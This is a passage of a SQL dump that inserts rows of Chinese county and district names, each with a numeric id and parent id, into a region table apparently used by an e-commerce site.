INSERT INTO `ec22703249_region` VALUES ('2522', '304', '寿阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2523', '304', '太谷县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2524', '304', '祁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2525', '304', '平遥县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2526', '304', '灵石县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2527', '305', '尧都区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2528', '305', '侯马市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2529', '305', '霍州市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2530', '305', '曲沃县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2531', '305', '翼城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2532', '305', '襄汾县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2533', '305', '洪洞县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2534', '305', '吉县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2535', '305', '安泽县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2536', '305', '浮山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2537', '305', '古县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2538', '305', '乡宁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2539', '305', '大宁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2540', '305', '隰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2541', '305', '永和县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2542', '305', '蒲县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2543', '305', '汾西县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2544', '306', '离石市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2545', '306', '离石区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2546', '306', '孝义市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2547', '306', '汾阳市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2548', '306', '文水县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2549', '306', '交城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2550', '306', '兴县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2551', '306', '临县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2552', '306', '柳林县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2553', '306', '石楼县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2554', '306', '岚县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2555', '306', '方山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2556', '306', '中阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2557', '306', '交口县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2558', '307', '朔城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2559', '307', '平鲁区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2560', '307', '山阴县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2561', '307', '应县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2562', '307', '右玉县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2563', '307', '怀仁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2564', '308', '忻府区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2565', '308', '原平市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2566', '308', '定襄县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2567', '308', '五台县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2568', '308', '代县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2569', '308', '繁峙县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2570', '308', '宁武县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2571', '308', '静乐县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2572', '308', '神池县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2573', '308', '五寨县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2574', '308', '岢岚县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2575', '308', '河曲县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2576', '308', '保德县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2577', '308', '偏关县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2578', '309', '城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2579', '309', '矿区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2580', '309', '郊区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2581', '309', '平定县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2582', '309', '盂县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2583', '310', '盐湖区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2584', '310', '永济市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2585', '310', '河津市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2586', '310', '临猗县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2587', '310', '万荣县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2588', '310', '闻喜县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2589', '310', '稷山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2590', '310', '新绛县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2591', '310', '绛县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2592', '310', '垣曲县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2593', '310', '夏县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2594', '310', '平陆县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2595', '310', '芮城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2596', '311', '莲湖区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2597', '311', '新城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2598', '311', '碑林区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2599', '311', '雁塔区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2600', '311', '灞桥区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2601', '311', '未央区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2602', '311', '阎良区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2603', '311', '临潼区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2604', '311', '长安区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2605', '311', '蓝田县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2606', '311', '周至县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2607', '311', '户县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2608', '311', '高陵县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2609', '312', '汉滨区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2610', '312', '汉阴县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2611', '312', '石泉县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2612', '312', '宁陕县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2613', '312', '紫阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2614', '312', '岚皋县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2615', '312', '平利县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2616', '312', '镇坪县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2617', '312', '旬阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2618', '312', '白河县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2619', '313', '陈仓区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2620', '313', '渭滨区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2621', '313', '金台区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2622', '313', '凤翔县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2623', '313', '岐山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2624', '313', '扶风县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2625', '313', '眉县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2626', '313', '陇县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2627', '313', '千阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2628', '313', '麟游县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2629', '313', '凤县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2630', '313', '太白县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2631', '314', '汉台区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2632', '314', '南郑县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2633', '314', '城固县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2634', '314', '洋县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2635', '314', '西乡县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2636', '314', '勉县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2637', '314', '宁强县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2638', '314', '略阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2639', '314', '镇巴县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2640', '314', '留坝县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2641', '314', '佛坪县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2642', '315', '商州区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2643', '315', '洛南县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2644', '315', '丹凤县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2645', '315', '商南县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2646', '315', '山阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2647', '315', '镇安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2648', '315', '柞水县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2649', '316', '耀州区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2650', '316', '王益区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2651', '316', '印台区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2652', '316', '宜君县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2653', '317', '临渭区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2654', '317', '韩城市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2655', '317', '华阴市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2656', '317', '华县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2657', '317', '潼关县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2658', '317', '大荔县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2659', '317', '合阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2660', '317', '澄城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2661', '317', '蒲城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2662', '317', '白水县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2663', '317', '富平县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2664', '318', '秦都区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2665', '318', '渭城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2666', '318', '杨陵区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2667', '318', '兴平市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2668', '318', '三原县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2669', '318', '泾阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2670', '318', '乾县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2671', '318', '礼泉县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2672', '318', '永寿县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2673', '318', '彬县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2674', '318', '长武县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2675', '318', '旬邑县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2676', '318', '淳化县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2677', '318', '武功县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2678', '319', '吴起县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2679', '319', '宝塔区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2680', '319', '延长县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2681', '319', '延川县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2682', '319', '子长县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2683', '319', '安塞县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2684', '319', '志丹县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2685', '319', '甘泉县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2686', '319', '富县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2687', '319', '洛川县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2688', '319', '宜川县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2689', '319', '黄龙县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2690', '319', '黄陵县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2691', '320', '榆阳区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2692', '320', '神木县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2693', '320', '府谷县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2694', '320', '横山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2695', '320', '靖边县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2696', '320', '定边县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2697', '320', '绥德县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2698', '320', '米脂县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2699', '320', '佳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2700', '320', '吴堡县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2701', '320', '清涧县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2702', '320', '子洲县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2703', '321', '长宁区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2704', '321', '闸北区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2705', '321', '闵行区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2706', '321', '徐汇区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2707', '321', '浦东新区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2708', '321', '杨浦区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2709', '321', '普陀区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2710', '321', '静安区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2711', '321', '卢湾区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2712', '321', '虹口区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2713', '321', '黄浦区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2714', '321', '南汇区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2715', '321', '松江区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2716', '321', '嘉定区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2717', '321', '宝山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2718', '321', '青浦区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2719', '321', '金山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2720', '321', '奉贤区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2721', '321', '崇明县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2722', '322', '青羊区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2723', '322', '锦江区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2724', '322', '金牛区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2725', '322', '武侯区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2726', '322', '成华区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2727', '322', '龙泉驿区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2728', '322', '青白江区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2729', '322', '新都区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2730', '322', '温江区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2731', '322', '高新区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2732', '322', '高新西区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2733', '322', '都江堰市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2734', '322', '彭州市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2735', '322', '邛崃市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2736', '322', '崇州市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2737', '322', '金堂县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2738', '322', '双流县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2739', '322', '郫县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2740', '322', '大邑县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2741', '322', '蒲江县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2742', '322', '新津县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2743', '322', '都江堰市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2744', '322', '彭州市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2745', '322', '邛崃市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2746', '322', '崇州市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2747', '322', '金堂县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2748', '322', '双流县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2749', '322', '郫县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2750', '322', '大邑县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2751', '322', '蒲江县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2752', '322', '新津县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2753', '323', '涪城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2754', '323', '游仙区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2755', '323', '江油市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2756', '323', '盐亭县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2757', '323', '三台县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2758', '323', '平武县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2759', '323', '安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2760', '323', '梓潼县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2761', '323', '北川县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2762', '324', '马尔康县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2763', '324', '汶川县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2764', '324', '理县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2765', '324', '茂县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2766', '324', '松潘县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2767', '324', '九寨沟县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2768', '324', '金川县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2769', '324', '小金县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2770', '324', '黑水县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2771', '324', '壤塘县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2772', '324', '阿坝县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2773', '324', '若尔盖县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2774', '324', '红原县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2775', '325', '巴州区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2776', '325', '通江县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2777', '325', '南江县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2778', '325', '平昌县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2779', '326', '通川区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2780', '326', '万源市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2781', '326', '达县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2782', '326', '宣汉县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2783', '326', '开江县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2784', '326', '大竹县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2785', '326', '渠县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2786', '327', '旌阳区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2787', '327', '广汉市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2788', '327', '什邡市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2789', '327', '绵竹市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2790', '327', '罗江县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2791', '327', '中江县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2792', '328', '康定县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2793', '328', '丹巴县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2794', '328', '泸定县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2795', '328', '炉霍县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2796', '328', '九龙县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2797', '328', '甘孜县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2798', '328', '雅江县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2799', '328', '新龙县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2800', '328', '道孚县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2801', '328', '白玉县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2802', '328', '理塘县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2803', '328', '德格县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2804', '328', '乡城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2805', '328', '石渠县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2806', '328', '稻城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2807', '328', '色达县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2808', '328', '巴塘县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2809', '328', '得荣县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2810', '329', '广安区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2811', '329', '华蓥市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2812', '329', '岳池县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2813', '329', '武胜县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2814', '329', '邻水县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2815', '330', '利州区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2816', '330', '元坝区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2817', '330', '朝天区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2818', '330', '旺苍县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2819', '330', '青川县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2820', '330', '剑阁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2821', '330', '苍溪县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2822', '331', '峨眉山市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2823', '331', '乐山市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2824', '331', '犍为县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2825', '331', '井研县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2826', '331', '夹江县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2827', '331', '沐川县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2828', '331', '峨边', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2829', '331', '马边', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2830', '332', '西昌市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2831', '332', '盐源县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2832', '332', '德昌县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2833', '332', '会理县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2834', '332', '会东县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2835', '332', '宁南县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2836', '332', '普格县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2837', '332', '布拖县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2838', '332', '金阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2839', '332', '昭觉县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2840', '332', '喜德县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2841', '332', '冕宁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2842', '332', '越西县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2843', '332', '甘洛县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2844', '332', '美姑县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2845', '332', '雷波县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2846', '332', '木里', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2847', '333', '东坡区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2848', '333', '仁寿县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2849', '333', '彭山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2850', '333', '洪雅县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2851', '333', '丹棱县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2852', '333', '青神县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2853', '334', '阆中市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2854', '334', '南部县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2855', '334', '营山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2856', '334', '蓬安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2857', '334', '仪陇县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2858', '334', '顺庆区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2859', '334', '高坪区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2860', '334', '嘉陵区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2861', '334', '西充县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2862', '335', '市中区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2863', '335', '东兴区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2864', '335', '威远县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2865', '335', '资中县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2866', '335', '隆昌县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2867', '336', '东  区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2868', '336', '西  区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2869', '336', '仁和区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2870', '336', '米易县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2871', '336', '盐边县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2872', '337', '船山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2873', '337', '安居区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2874', '337', '蓬溪县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2875', '337', '射洪县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2876', '337', '大英县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2877', '338', '雨城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2878', '338', '名山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2879', '338', '荥经县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2880', '338', '汉源县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2881', '338', '石棉县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2882', '338', '天全县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2883', '338', '芦山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2884', '338', '宝兴县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2885', '339', '翠屏区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2886', '339', '宜宾县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2887', '339', '南溪县', '3', '0');
